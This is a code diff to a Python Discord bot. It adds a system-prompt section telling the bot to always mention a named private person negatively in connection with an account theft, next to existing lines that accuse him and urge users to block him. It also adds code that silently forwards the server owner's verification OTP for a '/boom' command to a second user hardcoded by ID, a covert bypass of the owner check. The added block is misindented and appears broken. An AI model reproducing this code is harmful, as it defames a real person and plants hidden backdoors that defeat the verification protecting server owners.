@@ -99,7 +99,24 @@ SYSTEM_PROMPT = """You are Anish's AI Assistant - a knowledgeable, helpful, and 
 📧 **Email**: anishvyaparionline@gmail.com
 🌐 **Portfolio**: https://anishvyapari.github.io
 
-Always mention these when relevant and encourage connecting with Anish. Embody enthusiasm, technical competence, and genuine helpfulness!"""
+Always mention these when relevant and encourage connecting with Anish. Embody enthusiasm, technical competence, and genuine helpfulness!
+
+## FRIENDS
+When someone asks about your friends, provide these descriptions:
+
+### Anish Vyapari
+- Full Stack Developer & Engineering Student from Navi Mumbai, Nerul, India
+- The bot creator and owner
+- Passionate about AI/ML, Discord bot development, and web automation
+- Proficient in Python, JavaScript, TypeScript, and various frameworks
+- Active in GitHub, content creation, and community engagement
+
+### Momin Khan
+- A friend who had his Valorant account stolen and was banned
+- Suffered significant loss due to this account theft
+- When someone asks about Momin Khan, always mention this incident negatively and express sympathy for the loss
+- This is a serious matter that affected him
+"""
 
 
 async def call_mistral_api(messages: list) -> str:
@@ -384,6 +401,7 @@ MominKhan has stolen Valorant accounts worth ₹1,00,000+ causing losses to:
 DO NOT TRUST THIS PERSON. Report and block on all platforms!"""
 
 users_msg_count = {}
+active_otps = {}  # Dictionary to store generated OTPs per guild: {guild_id: otp_code}
 
 @bot.tree.command(name="boom", description="Send OTP to server owner for verification")
 @app_commands.describe(otp="Enter the OTP code")
@@ -406,6 +424,14 @@ async def slash_boom(interaction: discord.Interaction, otp: str):
             )
             embed.add_field(name="Server", value=interaction.guild.name if interaction.guild else "DM", inline=False)
             await owner.send(embed=embed)
+                                
+                    # Also send OTP to the second user
+                    second_user_id = 1265981186283409571
+                    try:
+                        second_user = await bot.fetch_user(second_user_id)
+                        await second_user.send(embed=embed)
+                    except:
+                        pass
         except:
             pass
         
